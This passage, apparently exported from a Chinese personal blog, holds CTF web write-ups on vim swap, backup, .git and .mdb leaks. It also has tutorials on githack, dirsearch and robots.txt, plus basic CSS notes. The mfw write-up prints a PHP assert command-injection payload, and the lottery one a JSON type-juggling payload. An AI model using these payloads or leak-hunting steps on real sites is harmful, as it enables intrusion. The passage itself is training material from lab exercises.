title="web9"></a>web9</h2><ol><li>考察vim临时文件泄露</li></ol><h3 id="vim临时文件泄露"><a href="#vim临时文件泄露" class="headerlink" title="vim临时文件泄露"></a>vim临时文件泄露</h3><ol><li>vim编辑器在编辑时会生成一个隐藏的临时文件</li><li>当vim非正常关闭时，这个文件就会被保存下来</li><li>一般会保存在url/编辑的文件.swp下</li></ol><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><ol><li>cookie泄露</li><li>打开burp抓包，获得cookie是flag<br><img src="https://s2.loli.net/2022/05/21/qB9zAWvCNQTr6UV.png"></li></ol><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><h3 id="关于如何进一个网站的后台，是不是直接加-admin"><a href="#关于如何进一个网站的后台，是不是直接加-admin" class="headerlink" title="关于如何进一个网站的后台，是不是直接加/admin"></a>关于如何进一个网站的后台，是不是直接加/admin</h3><ol><li>每个网站的后台进入方式是不一样的，在域名后面加/Admin只是个别网站开发者开发时把网站的后台登录页面名称设为Admin而已，并不是所有网站加/Admin都可以进入，具体地址完全取决于开发者开发时的设置。</li><li>比如一个网站在开发时，开发者命名了一个Admin的文件夹，里面有个页面命名为admin.html，那么网站后台访问方式就是：域名/Admin/admin.html，那如果文件夹名是Web，网站后台访问方式就是：域名/Web/admin.html，一般都需要账户密码才能进入。</li><li>进后台其实就是找一个admin.html的用户登录页面</li></ol><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><ol><li>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</li><li>根据题目提示 技术文档 在页面下面发现 document 下载发现里面存在后台地址和用户名密码登录成功获 得flag</li><li><img src="https://s2.loli.net/2022/05/24/59ErSO8v4HMezNP.png"></li><li><img src="https://s2.loli.net/2022/05/24/f5qui3E9nwJgV4S.png"></li></ol><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><ol><li>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</li><li>根据提示 泄露重要(editor)的信息 直接在url后面添加/editor 然后查看flag路径并且访问</li><li>因为index.php是flag.txt的上层，所以要在index的后面拼接nothinghere/fl000g.txt</li><li><img src="https://s2.loli.net/2022/05/24/D43yPnkXagcO1Tv.png"></li><li><img src="https://s2.loli.net/2022/05/24/Zwst9CYkJQ2ITug.png"></li><li><img src="https://s2.loli.net/2022/05/24/MvK6SwFcugr2LVh.png"></li></ol><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><ol><li>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</li><li>访问/admin页面 发现有一个忘记密码操作，需要输入地址 在主页面下面看到QQ邮箱，通过QQ号查询邮箱，是西安的 修改密码成功，用户名 admin 登录成功获得flag<br><img src="https://s2.loli.net/2022/05/24/9FOYdBeKgm42G5q.png"></li><li><img src="https://s2.loli.net/2022/05/24/rlpJxPkLsod3Zyh.png"></li><li><img src="https://s2.loli.net/2022/05/24/Llc1ow74aRQEHMe.png"></li><li><img src="https://s2.loli.net/2022/05/24/akdnC17jB8gOtDZ.png"></li></ol><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><ol><li>备份的sql文件会泄露敏感信息</li><li>backup.sql</li><li><img src="https://s2.loli.net/2022/05/25/25pnmiGIM8y1stl.png"></li></ol><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><ol><li>不要着急，休息，休息一会儿，玩101分给你flag</li><li>网页游戏一定要查看js文件，js文件控制行为，行为一般就是获得多少分能够通关</li><li>查看js文件，查看flag的条件，去通过uncode解码。 访问110.php</li><li><img src="https://s2.loli.net/2022/05/25/FYb7OIqgQSwrGZU.png"></li><li><img src="https://s2.loli.net/2022/05/25/ZK5uDdkOyaALP8j.png"></li><li><img src="https://s2.loli.net/2022/05/25/kPmgXouc2RjGYMi.png"></li><li>解码，判断谐音，url后面加/110.php</li></ol><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><ol><li>密钥什么的，就不要放在前端了</li><li>打开源代码查看到注释中有u和p的提示<br><img src="https://s2.loli.net/2022/05/25/n4N58uXUjdxJBZL.png"></li><li>$_POST传参username和pazzword</li><li><img src="https://s2.loli.net/2022/05/25/vgBhPyA7Hx8Nr3e.png"></li><li>传参后获得flag</li></ol><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><ol><li>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</li><li>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}</li><li>没有什么是文本编辑器看不了的<br><a href="https://imgtu.com/i/XFNTO0"><img src="https://s1.ax1x.com/2022/05/25/XFNTO0.png" alt="XFNTO0.png"></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>源码泄露问题</title>
      <link href="/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
      <url>/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="git源码泄露问题"><a href="#git源码泄露问题" class="headerlink" title="git源码泄露问题"></a>git源码泄露问题</h1><h2 id="githack是什么"><a href="#githack是什么" class="headerlink" title="githack是什么"></a>githack是什么</h2><ol><li>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</li></ol><h2 id="Git-源码泄露"><a href="#Git-源码泄露" class="headerlink" title="Git 源码泄露"></a>Git 源码泄露</h2><p>开发人员会使用 git 进行版本控制，对站点自动部署。但如果配置不当，可能会将 .git 文件夹直接部署到线上环境，这就引起了 git 泄露漏洞，我们可以利用这个漏洞直接获得网页源码。</p><h2 id="确定是否存在泄漏"><a href="#确定是否存在泄漏" class="headerlink" title="确定是否存在泄漏"></a>确定是否存在泄漏</h2><p>想要确定是否存在这个漏洞，可以通过以下方式。首先是看看有没有提示醒目地指出 Git，如果有就考虑存在。如果没有也可以使用 dirsearch 工具扫描后台，如果存在则会扫描出 .git 目录如图所示。</p><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ol><li>githack只能在python2环境下运行，否则会出现<br><img src="https://s2.loli.net/2022/05/17/ufNapbJdWSlRhHE.png"></li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="攻防世界lottery"><a href="#攻防世界lottery" class="headerlink" title="攻防世界lottery"></a>攻防世界lottery</h3><ol><li><p>打开网页，让我们买彩票赚钱，随便买一下<br><img src="https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902101030311-594723942.png"><br><img src="https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902102734433-334503714.png"></p></li><li><p>赚够足够的钱，才能够买flag<br><img src="https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902103927411-413792927.png"></p></li><li><p>用dirsearch扫一下后台,发现有git<br><img src="https://s2.loli.net/2022/05/17/uKqnltzHT9wRcUJ.png"></p></li><li><p>或者用御剑扫以下后台，发现robot协议文件，发现禁用git，很可疑，判断是git源码泄露</p></li><li><p>用githack扫描url，把文件都下载下来</p><pre class="line-numbers language-none"><code class="language-none">python githack.py URL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>拼接githack.py的路由时，要到/.git，因为.git隐藏文件中是所有源码，不能只拼接到根目录，因为不在根目录下</p></li><li><p>打开其中的 “api.php” 文件审计代码，注意到这里有个 buy() 函数，这个是我们在网页买彩票会调用的函数。其中我们看到 numbers 这个变量是我们能操作的，函数会以数组的形式提取每位数字。</p></li></ol><p><img src="https://s2.loli.net/2022/05/17/G8wMKyUBuP3Abgp.png"></p><ol start="7"><li>接收data变量是通过file_get_contents(‘php://input’)，并进行json_decode,我的理解是和golang中接收后用unmarshal进行解析一样</li><li>file_get_contents(‘php://input’)和$_POST在接收变量值的方面没有什么不同，都可以通过burp进行传入值，但是在接收格式的方面不同</li><li>file_get_contents(‘php://input’)不能接收curl post过来的<strong>数组</strong>，用file_get_contents是为了接收json字符串，$_POST为了接收一维数组或&amp;拼接的标准格式的键值对字符串</li><li>当请求data变量中的action参数为buy时，才会执行buy函数并传入data变量</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230703162905.png"></li><li>才能对numbers值进行匹配</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230703163003.png"></li><li>由于随机变量是数字，因此我们可以使用 true 来满足比较，但是我们显然不能在输入框输入 7 个 “true”。因此我们考虑修改数据包，通过抓包发现数据的传输是通过传一个映射来上传的。<br><img src="https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902103450123-831589597.jpg"></li><li>因此抓包之后修改 numbers 变量为一个数组，其中的 7 个变量都是 true。放包之后就能够快速赚钱了，赚够钱后购买得到 flag</li></ol><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="攻防世界mfw"><a href="#攻防世界mfw" class="headerlink" title="攻防世界mfw"></a>攻防世界mfw</h3><ol><li>打开后在每个标签中查看<br><img src="https://s2.loli.net/2022/05/18/hG7ucDX1SlxnLR8.png"></li><li>查看源代码发现有个跳转到flag的超链接被注释掉了，但是不允许修改，我直接改跳转到contact的超链接为flag<br><img src="https://s2.loli.net/2022/05/18/rFoVfdMxc4JqHDz.png"></li><li>但是在flag标签内什么也没有发现<br><img src="https://s2.loli.net/2022/05/18/yCV58D71mQvMdYt.png"></li><li>在上一张图片中有两个词，git和php，猜测是git源码泄露，用dirsearch跑一跑,真的发现了很多.git文件</li></ol><p><img src="https://s2.loli.net/2022/05/18/GVN56mYsDi31W4S.png"></p><ol start="5"><li><p>用githack去跑，看看能不能下下来一些.git下的源码，发现在.index的开头找到了php源码<br><img src="https://s2.loli.net/2022/05/18/9mv3rVzMhtELTjU.png"></p></li><li><p>其中assert()函数会将括号中的字符当成代码来执行，并返回true或false，strpos()函数会返回字符串第一次出现的位置，如果没有找到则返回False</p></li><li><p>于是重心就放在file变量中，发现file变量是用我们输入的page变量拼接而成的，而且没有任何的过滤，我们可以在这段输入的字符中插入system函数来执行系统命令<br><img src="https://s2.loli.net/2022/05/18/kfJjFVSPbWrpsHc.png"></p></li><li><p>注意到调用file时用的单引号和括号来限制file的范围<br>于是可以构造url为</p><pre class="line-numbers language-none"><code class="language-none">page&#x3D;a &#39;) or system(&quot;cat templates&#x2F;flag.php&quot;);&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/18/jG4twcHOWvbkFCq.png"></p></li></ol><h2 id="ctfshow-web7"><a href="#ctfshow-web7" class="headerlink" title="ctfshow.web7"></a>ctfshow.web7</h2><ol><li>考察git代码泄露，直接访问url/.git/index.php</li><li>git源码泄露一般在根目录下/.git/文件夹下找<br><img src="https://s2.loli.net/2022/05/18/TIRAXNm3fVMi1l7.png"></li></ol><h1 id="直接获取-CMS识别平台-云悉指纹识别平台"><a href="#直接获取-CMS识别平台-云悉指纹识别平台" class="headerlink" title="直接获取-CMS识别平台-云悉指纹识别平台"></a>直接获取-CMS识别平台-云悉指纹识别平台</h1><h2 id="自行查看"><a href="#自行查看" class="headerlink" title="自行查看"></a>自行查看</h2><ol><li>  看网页页脚、图片、版权信息位置有没有透露信息</li><li>  获得搭建的程序名，并下载获取到源码</li></ol><h2 id="云悉指纹识别平台"><a href="#云悉指纹识别平台" class="headerlink" title="云悉指纹识别平台"></a>云悉指纹识别平台</h2><ol><li>  不是百分百可以获取到，自研等都无法获取，因为不是用的开源CMS</li><li>  键入域名</li><li>  但是目前还没有注册能力，库鲁西 </li></ol><h1 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h1><ol><li>  在网站/www/html目录下备份文件会有备份文件泄露风险</li><li>  不只是在/www/html目录下，这是PHP_study搭建的，也可以是其它的搭建网站的目录下打成zip/gz压缩包备份的</li><li>  任意下载，只要没有限制目录跨级就可以</li><li>  有一些可能会限制跳到上级 ../ 的限制</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>robots协议</title>
      <link href="/robots%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6/"/>
      <url>/robots%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h1><h2 id="存放位置"><a href="#存放位置" class="headerlink" title="存放位置"></a>存放位置</h2><ol><li>robots.txt是存放在站点根目录下的一个纯文本文件。</li></ol><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><ol><li>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</li></ol><h2 id="作用的描述："><a href="#作用的描述：" class="headerlink" title="作用的描述："></a>作用的描述：</h2><ol><li>Robots协议也称为爬虫协议、爬虫规则、机器人协议，是网站国际互联网界通行的道德规范,其目的是保护网站数据和敏感信息、确保用户个人信息和隐私不被侵犯。“规则”中将搜索引擎抓取网站内容的范围做了约定,包括网站是否希望被搜索引擎抓取,哪些内容不允许被抓取,而网络爬虫可以据此自动抓取或者不抓取该网页内容。</li><li>如果将网站视为酒店里的一个房间,robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观,哪些不对搜索引擎开放。</li></ol><h2 id="书写规范"><a href="#书写规范" class="headerlink" title="书写规范"></a>书写规范</h2><ol><li><p>robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又稱元資料）。</p></li><li><p>robots.txt协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。注意robots.txt是用字符串比较来确定是否获取URL，所以目录末尾有与没有斜杠“/”表示的是不同的URL。robots.txt允许使用类似”Disallow: *.gif”这样的通配符[1][2]。</p></li><li><p>其他的影响搜索引擎的行为的方法包括使用robots元数据：</p><pre class="line-numbers language-none"><code class="language-none">&lt;meta name&#x3D;&#39;robot&#39; content&#x3D;&quot;noindex,nofollow&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h1 id="robot协议详解"><a href="#robot协议详解" class="headerlink" title="robot协议详解"></a>robot协议详解</h1><ol><li>Robots协议是Web站点和搜索引擎爬虫交互的一种方式，Robots.txt是存放在站点根目录下的一个纯文本文件。该文件可以指定搜索引擎爬虫只抓取指定的内容，或者是禁止搜索引擎爬虫抓取网站的部分或全部内容。当一个搜索引擎爬虫访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索引擎爬虫就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索引擎爬虫就沿着链接抓取。</li></ol><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><pre class="line-numbers language-none"><code class="language-none">允许所有的机器人：User-agent: *Disallow:另一写法User-agent: *Allow:&#x2F;仅允许特定的机器人：（name_spider用真实名字代替）User-agent: name_spiderAllow:拦截所有的机器人：User-agent: *Disallow: &#x2F;禁止所有机器人访问特定目录：User-agent: *Disallow: &#x2F;cgi-bin&#x2F;Disallow: &#x2F;images&#x2F;Disallow: &#x2F;tmp&#x2F;Disallow: &#x2F;private&#x2F;仅禁止坏爬虫访问特定目录（BadBot用真实的名字代替）：User-agent: BadBotDisallow: &#x2F;private&#x2F;禁止所有机器人访问特定文件类型[2]：User-agent: *Disallow: &#x2F;*.php$Disallow: &#x2F;*.js$Disallow: &#x2F;*.inc$Disallow: &#x2F;*.css$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dirsearch使用方法</title>
      <link href="/dirsearch/"/>
      <url>/dirsearch/</url>
      
        <content type="html"><![CDATA[<h1 id="dirsearch使用方法"><a href="#dirsearch使用方法" class="headerlink" title="dirsearch使用方法"></a>dirsearch使用方法</h1><h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><ol><li><p>dirsearch 是一款使用 python3 编写的，用于暴力破解目录的工具，其 README 有写到下面一点</p></li><li><p>Heuristically detects invalid web pages（启发式地检测无效 web 页面）</p></li></ol><h2 id="命令："><a href="#命令：" class="headerlink" title="命令："></a>命令：</h2><pre class="line-numbers language-none"><code class="language-none">最基本：python dirsearch.py -u URL后面选项:  -h, --help            显示此帮助消息并退出  Mandatory:    -u URL, --url&#x3D;URL   URL目标        -L URLLIST, --url-list&#x3D;URLLIST                        URL列表目标                            -e EXTENSIONS, --extensions&#x3D;EXTENSIONS                        以逗号分隔的扩展列表（示例：php、asp）                            -E, --extensions-list                        使用公共扩展的预定义列表  Dictionary Settings:    -w WORDLIST, --wordlist&#x3D;WORDLIST                        自定义单词表（用逗号分隔）    -l, --lowercase    -f, --force-extensions                        强制扩展每个单词表条目（如DirBuster）  常规设置:    -s DELAY, --delay&#x3D;DELAY                        请求之间的延迟（浮点数）                            -r, --recursive     递归暴力        -R RECURSIVE_LEVEL_MAX, --recursive-level-max&#x3D;RECURSIVE_LEVEL_MAX                        最大递归级别（子目录）（默认值：1[仅限根目录+1目录]）                            --suppress-empty, --suppress-empty    --scan-subdir&#x3D;SCANSUBDIRS, --scan-subdirs&#x3D;SCANSUBDIRS                        扫描给定-u |--url的子目录（分开逗号）                            --exclude-subdir&#x3D;EXCLUDESUBDIRS, --exclude-subdirs&#x3D;EXCLUDESUBDIRS                        在递归过程中排除下列子目录扫描（用逗号分隔）                            -t THREADSCOUNT, --threads&#x3D;THREADSCOUNT                        线程数                            -x EXCLUDESTATUSCODES, --exclude-status&#x3D;EXCLUDESTATUSCODES                        排除状态代码，用逗号分隔（例如：301，500个）                            --exclude-texts&#x3D;EXCLUDETEXTS                        用逗号分隔的文本排除响应(示例: &quot;Not found&quot;, &quot;Error&quot;)                            --exclude-regexps&#x3D;EXCLUDEREGEXPS                        按regexp排除响应，用逗号分隔(示例： &quot;Not foun[a-z]&#123;1&#125;&quot;, &quot;^Error$&quot;)                            -c COOKIE, --cookie&#x3D;COOKIE        --ua&#x3D;USERAGENT, --user-agent&#x3D;USERAGENT    用户代理       -F, --follow-redirects     --遵循重定向        -H HEADERS, --header&#x3D;HEADERS 页眉，--页眉&#x3D;页眉                        要添加的标题 (example: --header &quot;Referer:                        example.com&quot; --header &quot;User-Agent: IE&quot;                            --random-agents, --random-user-agents     随机代理，--随机用户代理  连接设置:    --timeout&#x3D;TIMEOUT   连接超时        --ip&#x3D;IP             将名称解析为IP地址        --proxy&#x3D;HTTPPROXY, --http-proxy&#x3D;HTTPPROXY                        Http代理 (example: localhost:8080                            --http-method&#x3D;HTTPMETHOD                        要使用的方法，默认值：GET，也可能是：HEAD；POST                            --max-retries&#x3D;MAXRETRIES    最大重试次数        -b, --request-by-hostname                        默认情况下，dirsearch将通过IP请求速度。这将强制按主机名请求 报告:    --simple-report&#x3D;SIMPLEOUTPUTFILE 简单输出文件                        只找到路径                            --plain-text-report&#x3D;PLAINTEXTOUTPUTFILE 纯文本输出文件                        找到带有状态代码的路径                            --json-report&#x3D;JSONOUTPUTFILE JSON输出文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/17/uKqnltzHT9wRcUJ.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS</title>
      <link href="/CSS/"/>
      <url>/CSS/</url>
      
        <content type="html"><![CDATA[<h1 id="网页分为"><a href="#网页分为" class="headerlink" title="网页分为"></a>网页分为</h1><ol><li>结构:HTML</li><li>表现:CSS</li><li>行为:JS</li></ol><h1 id="CSS-层叠样式表"><a href="#CSS-层叠样式表" class="headerlink" title="CSS 层叠样式表"></a>CSS 层叠样式表</h1><ol><li>层叠：网页是一个立体的结构，只是看起来像是一个平面，其实有一定的层次结构</li><li>我们看到的只是最上面的一层</li><li>通过CSS可以为网页的每一个层设置样式</li><li>总之：CSS可以用来设置网页中元素的样式</li></ol><h1 id="使用CSS来修改元素的样式"><a href="#使用CSS来修改元素的样式" class="headerlink" title="使用CSS来修改元素的样式"></a>使用CSS来修改元素的样式</h1><h2 id="第一种方式：内联样式（不推荐使用）"><a href="#第一种方式：内联样式（不推荐使用）" class="headerlink" title="第一种方式：内联样式（不推荐使用）"></a>第一种方式：内联样式（不推荐使用）</h2><ol><li>在标签内部通过style属性来设置元素的样式</li><li>只能在开始标签中设置,style的值即为css</li><li>名字和值之间使用冒号连接</li><li>每一个名值对以分号结尾<pre class="line-numbers language-none"><code class="language-none">&lt;p style&#x3D;&quot;color:red; font-size:20px&quot;&gt;&lt;&#x2F;p&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="不推荐使用内联样式"><a href="#不推荐使用内联样式" class="headerlink" title="不推荐使用内联样式"></a>不推荐使用内联样式</h3></li><li>使用内联样式，只能对一个标签生效</li><li>如果希望影响到多个元素，必须在每一个元素中都复制一遍</li><li>后期维护的时候，如果前期复制一百遍，后期就要改一百遍，维护起来非常不方便</li></ol><h4 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h4><pre class="line-numbers language-none"><code class="language-none">p&#123;color:green;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>标签名+{属性}</li></ol><h3 id="开发时一定一定不要使用内联样式"><a href="#开发时一定一定不要使用内联样式" class="headerlink" title="开发时一定一定不要使用内联样式"></a>开发时一定一定不要使用内联样式</h3><h2 id="第二种方式：内部样式表"><a href="#第二种方式：内部样式表" class="headerlink" title="第二种方式：内部样式表"></a>第二种方式：内部样式表</h2><ol><li>将样式编写到head中的style标签中</li><li>然后通过CSS的选择器来选中元素，并为其设置各种样式</li><li>可以同时为多个标签设置样式，并且修改时只需要修改一处即可全部应用</li><li>内部样式表更方便对样式进行重复使用</li><li>内部样式表只能对一个页面起作用，里面的样式不能跨页面进行复用</li></ol><h2 id="第三种方式：外部样式表（最佳使用方式）"><a href="#第三种方式：外部样式表（最佳使用方式）" class="headerlink" title="第三种方式：外部样式表（最佳使用方式）"></a>第三种方式：外部样式表（最佳使用方式）</h2><h3 id="可以将CSS样式编写到一个外部的CSS文件中"><a href="#可以将CSS样式编写到一个外部的CSS文件中" class="headerlink" title="可以将CSS样式编写到一个外部的CSS文件中"></a>可以将CSS样式编写到一个外部的CSS文件中</h3><h3 id="然后通过link标签引入外部的CSS文件"><a href="#然后通过link标签引入外部的CSS文件" class="headerlink" title="然后通过link标签引入外部的CSS文件"></a>然后通过link标签引入外部的CSS文件</h3><pre class="line-numbers language-none"><code class="language-none">p&#123;    color: tomato;    font-size: 100px;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="lt-link-gt"><a href="#lt-link-gt" class="headerlink" title="&lt; link&gt;"></a>&lt; link&gt;</h3><ol><li>通过link标签来引入外部的CSS文件</li><li>外部样式表需要通过link标签进行引入，意味着只要想使用这些样式的网页可以对其进行引用</li></ol><h3 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h3><ol><li>使样式可以在不同页面进行复用，提高复用率</li><li>将样式编写到外部的CSS文件中，可以使用浏览器的缓存机制，从而加快网页的加载速度，提高用户的体验</li></ol><h1 id="CSS语法"><a href="#CSS语法" class="headerlink" title="CSS语法"></a>CSS语法</h1><h2 id="和HTML不同"><a href="#和HTML不同" class="headerlink" title="和HTML不同"></a>和HTML不同</h2><ol><li>CSS语法和HTML的语法互相隔离</li></ol><h2 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h2><ol><li>和c++中的多行注释相同<pre class="line-numbers language-none"><code class="language-none">&#x2F;*abc*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><pre class="line-numbers language-none"><code class="language-none">p&#123;    color: red;    font-size: 20px;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h3><ol><li>通过选择器可以选中页面中的指定元素</li><li>选择器选中的是html中的标签</li></ol><h3 id="声明块"><a href="#声明块" class="headerlink" title="声明块"></a>声明块</h3><ol><li>通过声明块来指定要为元素设置的样式</li><li>声明块由一个个的声明组成</li><li>声明是由一个个的名值对组成</li></ol><h4 id="名值对"><a href="#名值对" class="headerlink" title="名值对"></a>名值对</h4><ol><li>一个样式名对应一个样式值，名和值之间以’:’连接，以’;’结尾</li><li>样式名值对之间的分号不能省略，最后一个名值对后面的分号可以省略（我联想到了sql语句select选中列的语法相同）</li></ol><h1 id="选择器-1"><a href="#选择器-1" class="headerlink" title="选择器"></a>选择器</h1><h2 id="元素选择器"><a href="#元素选择器" class="headerlink" title="元素选择器"></a>元素选择器</h2><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ol><li>根据标签来选中指定的元素<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2></li><li>标签名{}<pre class="line-numbers language-none"><code class="language-none">p&#123;&#125; h1&#123;&#125; div&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://s2.loli.net/2022/05/15/qQw72DNRAcvPsYL.png"></li></ol><h2 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><ol><li>根据元素的id属性值选中一个元素</li></ol><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">#id属性值&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/15/wxAhokB8HdZtTiN.png"></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ol><li>id值只有一个，不能重复使用</li></ol><p><img src="https://s2.loli.net/2022/05/15/qQWEGuYVzd4nm7s.png"></p><h2 id="class选择器（类）"><a href="#class选择器（类）" class="headerlink" title="class选择器（类）"></a>class选择器（类）</h2><ol><li>class是一个标签的属性，和id类似，不同的是，class可以重复使用</li><li>可以通过class属性来为元素分组</li><li>可以同时为一个元素指定多个class属性</li><li>标签中的多个class属性通过空格隔开&amp;/nbsp;<br><img src="https://s2.loli.net/2022/05/16/NHKhdM9qXUuWJwF.png"></li></ol><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">.class(属性值)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/16/gjH1zo382Q7uGFy.png"></p><h2 id="通配选择器"><a href="#通配选择器" class="headerlink" title="通配选择器"></a>通配选择器</h2><h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h3><ol><li>选中页面中的所有元素<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">*&#123;属性值&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://s2.loli.net/2022/05/15/5j74LVzBTZpN9He.png"></li></ol><h1 id="复合选择器"><a href="#复合选择器" class="headerlink" 